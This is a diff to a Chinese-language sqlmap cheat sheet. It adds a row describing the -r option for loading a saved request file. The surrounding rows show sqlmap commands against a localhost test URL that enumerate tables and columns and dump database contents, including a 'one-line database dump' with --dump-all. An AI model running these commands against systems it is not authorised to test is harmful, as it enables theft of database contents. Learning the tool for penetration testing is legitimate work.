@@ -46,6 +46,7 @@
 | -D 数据库名 --tables                     | 列出数据库的表名                                             | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "security" --tables |
 | -D 数据库名 -T 表名 --columns            | 列出字段名                                                   | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "test" -T "test" --columns |
 | -D 数据库名 -T 表名 -C "id,name"　--dump | 列出字段值                                                   | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "test" -T "test" -C "id,name"　--dump |
+| -r                                       | 本地seesion文本                                              |                                                              |
 
 **一句话脱库：sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "数据库名" --dump-all**
 
